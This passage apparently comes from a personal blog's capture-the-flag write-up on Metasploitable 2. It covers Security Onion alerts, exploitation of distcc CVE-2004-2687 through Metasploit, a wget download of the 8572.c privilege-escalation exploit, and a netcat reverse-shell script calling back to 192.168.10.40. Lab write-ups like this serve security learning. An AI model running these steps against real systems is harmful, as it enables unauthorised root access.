(i will try my best to describe what had happened as i am still getting used to security onion as of now)\nyou can see a lot of alerts. these alerts are around the time frame of our attack.\nthe first few alerts are in regards to our nmap scan. the alert named \u0026ldquo;gpl dns named version attempt\u0026rdquo; shows that the nmap scan was trying to get information on the version of running services.\nthe alert i want to dive into is \u0026ldquo;gpl attack_response id check returned root\u0026rdquo;. this alert was triggered when we exploited the ftp server and gained root access to the system.\nin the image above, when inspecting this alert further, we see our user input when we gained full access to the system. however, the alert was triggered due to the id command which gave us the following information:\nuid=0(root) gid=0(root)\nhence triggering the alert.\ndistcc cve-2004-2687 is a vulnerability that allows one to perform remote code execution on servers that have the \u0026ldquo;distributed c compiler\u0026rdquo; deamon running on them.\nwhat is distcc? distcc stands for \u0026quot;distributed c compiler\u0026quot;. it allows programmers to compile code using not only the local machine but also all available servers too. these servers would utilize their unused processing power to help compile to the code too. the compilation takes place through the user's remote commands to the servers. typically, the user would send the source code and the compilation commands to all the available serves to help compile the code distcc usually operates under port 3632. we can see that versions earlier \u0026amp; including 3.1 of distcc are all vulnerable to foreign system commands. we will use a pre-written nmap script to remotely execute code for demonstration.\nenumeration the \u0026ndash;script command below allows one to use pre-written scripts for many services and functions. were using this pre-written script for the distcc vulnerability. i used the \u0026ndash;script-args option for us to enter our command, in this case, echo.\nhowever, conducting further enumeration like this would be time-consuming. so were going to use the msfconsole to execute a remote shell to the system.\nusing msf, we can see an exploit regarding distcc does exist. we\u0026rsquo;ll use this.\nbelow are the configurable options for this exploit in msf: i set the rhosts to the target address.\nexploitation this exploit also has many payload options, the one i am using is called cmd/unix/bind_ruby. once the payload is set, we can now hit exploit.\nupon exploiting, we have a reverse shell towards teh system, however, this is only a deamon shell with restrictive privileges. lets escalate!!\nlocal privilege escalation so now that we have reverse shell access, its time to escalate ourselves to root. to do this, i am going to make use of a c script found locally in kali known as 8572.c which locally escalates a user\u0026rsquo;s privileges in a machine.\ni have started an apache server on kali and have copied the script over to the webserver.\nnow we shall go back to the reverse shell and download the script via wget.\ni renamed the file from 8572.c to priv.c\nat this point, its time we setup a reverse shell connection using netcat on port 5555 (any available port would do).\nokay, so far we have prepared reverse connection on port 5555 using netcat as well as downloaded our exploit onto the target system via our unprivileged reverse shell connection using msf.\nnow we are going to create a shell back to the kali system from the target\u0026rsquo;s system using the following commands:\nwe will first command will create a file named run in the /tmp directory. the second command appends a netcat command that will connect to our listening nc session to the *run file. the third command just displays the output for safe measure. reverse shell code echo '#!/bin/sh' \u0026gt; /tmp/run echo '/bin/netcat -e /bin/sh 192.168.10.40 5555' \u0026gt;\u0026gt; /tmp/run cat run #!/bin/sh /bin/netcat -e /bin/sh 192.168.10.40 5555 now using gcc, we shall compile the code, i saved the output as pivesc using the -o option for clarity\u0026rsquo;s sake.\ni used the chmod command to give it full read, write \u0026amp; execute permission too.\nnetlink is used to establish a network communication between the kernel \u0026amp; user-space processes to transfer information.\nwe shall take advantage of this by hijacking a user-space process to run our privesc exploit.\nstarting off, we\u0026rsquo;ll use the cat command to output netlink processes.\ni hijacked the process with the pid of 2783 by associating it with privesc using ./privesc 2783. doing this would execute the exploit, giving us a privileged reverse shell on our netcat server.\nas you can see, the netcat server has made a successful connection to the targets machine as root.\n","title":"CTF 1: Metasploitable 2"},{"date":"2023-12-03","image":"/images/Homelab/HTopology.png","imageAlt":"","link":"https://www.haroonakram.co.uk/projects/homelab/","summary":"My Homelab Setup: The topology above is supposed to be my homelab, although my artistic efforts are questionable to say the least, I hope it gives you an idea as to what technologies I\u0026rsquo;ll be dealing with.","tags":["Homelab","Projects"],"text":"my homelab setup: the topology above is supposed to be my homelab, although my artistic efforts are questionable to say the least, i hope it gives you an idea as to what technologies i\u0026rsquo;ll be dealing with. credit goes to marko andrejiÄ‡ , from whom i drew inspiration to build this lab.\nthis homelab is my attempt at various cyber operations like offensive security \u0026amp;
